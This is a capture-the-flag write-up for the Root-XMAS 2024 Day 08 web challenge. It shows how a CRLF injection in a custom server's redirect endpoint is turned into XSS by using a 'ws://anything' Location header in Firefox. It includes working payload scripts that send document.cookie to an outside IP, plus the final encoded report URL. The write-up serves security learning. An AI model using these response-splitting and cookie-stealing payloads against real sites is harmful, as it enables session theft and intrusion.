---
title: Root-XMAS 2024 Day 08 - Custom HTTP Server
feed: hide
permalink: /RootXMAS_2024_08
date: 08-12-2024
summary: You redirected to the wrong neighbourhood.
---
### summary


A web challenge with a redirection endpoint allowing any user input. An CLRF injection / # HTTP response splitting allows to insert custom headers and body to the server's response.
However, as the returned response is a 302 redirect, to force the browser staying on the page and to execute our XSS payload, we set the location of the redirect to a Websocket (`Location: ws://anything`)
### recon

Santa has completely recreated a web framework and asserts it's completely safe! He even provided the source code so we can audit it!

Let's check it out. On the `app.js` we have listed all the endpoints, and one gets our attention: `/api/report`

defined in `reporter.js` we have:
```js
  static async generateReport(url) {
	...
	browser = await firefox.launch(...);
	const page = await browser.newPage();

	const cookie = {
        name: 'FLAG',
        value: 'RM{REDACTED}',
        domain: '127.0.0.1',
        path: '/',
        httpOnly: false,
        secure: false,
      };

      await page.context().addCookies([cookie]);

      await page.goto(url, {
        waitUntil: 'domcontentloaded',
        timeout: 30000,
      });
...
```

Ok, so the report endpoint starts a Firefox instance with a flag cookie for the localhost, we just have to find an XSS on it, and we can steal it!
And look, there's an `/api/xss` endpoint! maybe we can find an error in its sanitizer, let's check it out! in `sanitizer.js`

```js
static escapeHtml(str) {
	return str.replace(/[&<>"']/g, char => htmlEntities[char]);
}

static xss(input) {
	return this.escapeHtml(input);
}
```

Oh... no, it's correctly escaped, there's really nothing we can do... rats!
There are also some other endpoints, but they do not take user input as parameters (`/api/xml`), or are properly sanitized (`/api/sql`)

But wait, we have the classic and juicy endpoint... `/api/redirect` !
let's check it out in `response.js`

```js
  redirect(location, isPermanent = false) {
	...
    const head = `HTTP/1.1 ${statusCode} Found\r\nLocation: ${location}\r\nConnection: close\r\n\r\n`;
    socket.write(head);
	...
  }
```

Right there! our user input, `location` is not escaped, so we can add `\r\n` characters to add our custom headers, and even HTML body, including javascript! it's an [HTTP Response splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting) vuln, a form of  [CLRF injection](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a#http-response-splitting) .
So let's try it out!
### solution

Here is a script to create a payload with an HTML body containing a script exfiltrating the cookie, and correct  `Content-Type` and `Content-Length` headers

```js
location_header = "test"
htmlPayload = '<html><script>document.location="http://11.111.111.111:49153?cookie="+document.cookie</script></html>'

clrfPayload = location_header + "\r\nContent-Type: text/html\r\nContent-Length: " + htmlPayload.length + "\r\n\r\n" + htmlPayload

encodedPayload = encodeURIComponent(clrfPayload)
redirectionUrl = "http://dyn-01.xmas.root-me.org:37120/api/redirect?url=" + encodedPayload
document.location = redirectionUrl
```

and it works! when testing in Caido we get this response from the server!

```c
HTTP/1.1 302 Found
Location: /test
Content-Type: text/html
Content-Length: 113

<html><script>document.location="http://11.111.111.111:49153?cookie="+document.cookie</script></html>
Connection: close
```

However, when we test in the browser... we are redirected to our `location_header` we defined at the start of our CLRF payload! , so `/test`. Our Javascript is never interpreted!

More strange behavior, if we put an empty `Location` header, we see in the devtools that Firefox sends multiple redirects requests before giving up. strange behavior... 

We are on the right track, surely. Let's search online "avoid 302 redirection crlf injection"...
and we find this wonderful blog page, [jorianwoltjer.com : web/header-crlf-injection](https://book.jorianwoltjer.com/web/header-crlf-injection)  that gives us payloads that force Firefox to stay on the page and execute our Javascript!

```js
// Firefox
Location: ws://anything
Location: wss://anything
Location: resource://anything

// Chrome
Location:
```

Hey, so we really were on the right track, our empty payload would have worked on Chrome!
So we just have to set on top of our script

```js
location_header = "ws://anything"
```

and then we can trigger the XSS, my server recieves the request!
Now to send it to the `/api/report` endpoint , and we can flag!

The full script below:
We re-encode the redirect url to send it to the report endpoint.
Also remember that we have to change the host of the redirect endpoint as `127.0.0.1` for the admin cookie to be set :

```js
location_header = "ws://anything" //firefox only
htmlPayload = '<html><script>document.location="http://11.111.111.111:49153?cookie="+document.cookie</script></html>'

clrfPayload = location_header + "\r\nContent-Type: text/html\r\nContent-Length: " + htmlPayload.length + "\r\n\r\n" + htmlPayload

eRedirectPayload = encodeURIComponent(clrfPayload)
redirectionUrl = "http://127.0.0.1:3000/api/redirect?url=" + eRedirectPayload

eReportPayload = encodeURIComponent(redirectionUrl)
portInstance = 37120
reportUrl = "http://dyn-01.xmas.root-me.org:" + portInstance + "/api/report?url=" + eReportPayload
```

We get a final report URL like this:

```bash
http://dyn-01.xmas.root-me.org:37120/api/report?url=http://127.0.0.1%3A3000%2Fapi%2Fredirect%3Furl%3Dws%253A%252F%252Fanything%250D%250AContent-Type%3A%20text%2Fhtml%250D%250AContent-Length%3A%20113%250D%250A%250D%250A%3Chtml%3E%3Cscript%3Edocument.location%3D%22http%3A%2F%2F11.111.111.111%3A49153%3Fcookie%3D%22%252Bdocument.cookie%3C%2Fscript%3E%3C%2Fhtml%3E
```

and we get the flag on our SimpleHTTPServer:

```http
GET /?cookie=FLAG=RM{Damnn_Chrome_And_Firefox_4re_S0_different} HTTP/1.1" 200 -
```


| Previous day | [[Day 07 - Go, Pwn, Gown]]       |
| ------------ | -------------------------------- |
| Next day     | [[Day 09 - The Christmas Thief]] |